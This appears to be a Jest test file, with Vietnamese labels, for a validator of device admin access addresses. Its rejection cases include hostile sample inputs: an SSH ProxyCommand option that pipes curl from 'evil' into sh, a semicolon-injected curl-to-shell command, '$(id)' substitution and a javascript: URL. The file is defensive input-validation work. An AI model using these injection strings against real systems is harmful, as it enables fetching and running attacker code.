import { ACCESS_MAX, normalizeAccessPoints } from './device-access';

describe('normalizeAccessPoints — Truy cập quản trị (Q-26)', () => {
  it.each([
    ['rỗng', [], []],
    ['Web có cổng', [{ kind: 'web', address: ' 10.0.1.1 ', port: 8443 }], [{ kind: 'web', address: '10.0.1.1', port: 8443 }]],
    ['SSH không cổng', [{ kind: 'ssh', address: 'sw-core.pmh.local' }], [{ kind: 'ssh', address: 'sw-core.pmh.local', port: null }]],
    ['SSH có user@ và IPv6', [{ kind: 'ssh', address: 'admin@[fe80::1]' }], [{ kind: 'ssh', address: 'admin@[fe80::1]', port: null }]],
    ['Web URL đủ', [{ kind: 'web', address: 'https://10.0.1.1:4444/ui' }], [{ kind: 'web', address: 'https://10.0.1.1:4444/ui', port: null }]],
    ['dòng trống bị bỏ', [{ kind: 'rdp', address: '   ' }, { kind: 'winbox', address: '10.0.0.2', port: 8291 }], [{ kind: 'winbox', address: '10.0.0.2', port: 8291 }]],
  ])('%s', (_name, input, expected) => {
    expect(normalizeAccessPoints(input)).toEqual(expected);
  });

  it.each([
    ['kiểu lạ', [{ kind: 'ftp', address: 'x' }], /Kiểu truy cập/],
    ['cổng ngoài 1–65535', [{ kind: 'ssh', address: 'x', port: 70000 }], /Cổng/],
    ['địa chỉ có khoảng trắng', [{ kind: 'web', address: 'http://a b' }], /Địa chỉ/],
    ['quá nhiều dòng', Array.from({ length: ACCESS_MAX + 1 }, (_, i) => ({ kind: 'ssh', address: `h${i}` })), /Tối đa/],
    ['không phải mảng', 'ssh://x', /danh sách/],
    // Địa chỉ đi vào lệnh SSH người dùng chép ra terminal: chặn tuỳ chọn và ký tự shell.
    ['SSH chèn tuỳ chọn', [{ kind: 'ssh', address: '-oProxyCommand=curl${IFS}evil|sh' }], /dấu gạch/],
    ['SSH chèn lệnh', [{ kind: 'ssh', address: '10.0.0.1;curl${IFS}x|sh' }], /tên máy hoặc IP/],
    ['Telnet có dấu $', [{ kind: 'telnet', address: '$(id)' }], /tên máy hoặc IP/],
    ['Web scheme lạ', [{ kind: 'web', address: 'javascript:alert(1)' }], /http/],
    ['Khác mở đầu bằng gạch', [{ kind: 'other', address: '-x' }], /gạch/],
  ])('%s → 400', (_name, input, message) => {
    let caught: unknown = null;
    try {
      normalizeAccessPoints(input);
    } catch (error) {
      caught = error;
    }
    expect(caught).toMatchObject({ response: { code: 'DEVICE_ACCESS_INVALID', message: expect.stringMatching(message) as unknown } });
  });
});
